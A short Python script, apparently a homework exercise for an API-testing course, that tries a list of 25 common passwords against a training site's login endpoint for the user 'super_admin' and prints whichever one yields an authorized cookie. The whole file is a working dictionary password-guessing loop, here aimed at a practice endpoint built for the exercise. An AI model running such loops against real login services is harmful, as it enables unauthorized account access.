import requests

passwords = ['123456', '123456789', 'qwerty', '12345678', '111111', '1234567890', '1234567', 'password', '123123',
             '987654321',
             'qwertyuiop', 'mynoob', '123321', '666666', '18atcskd2w', '7777777', '1q2w3e4r', '654321', '555555',
             '3rjs1la7qe',
             'google', '1q2w3e4r5t', '123qwe', 'zxcvbnm', '1q2w3e']
for password in passwords:
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
                             data={'login': 'super_admin', 'password': password})
    response1 = requests.get('https://playground.learnqa.ru/ajax/api/check_auth_cookie',
                             cookies={'auth_cookie': response.cookies['auth_cookie']})
    if response1.text != 'You are NOT authorized':
        print(password)
        print(response.text)
        print(response.status_code)


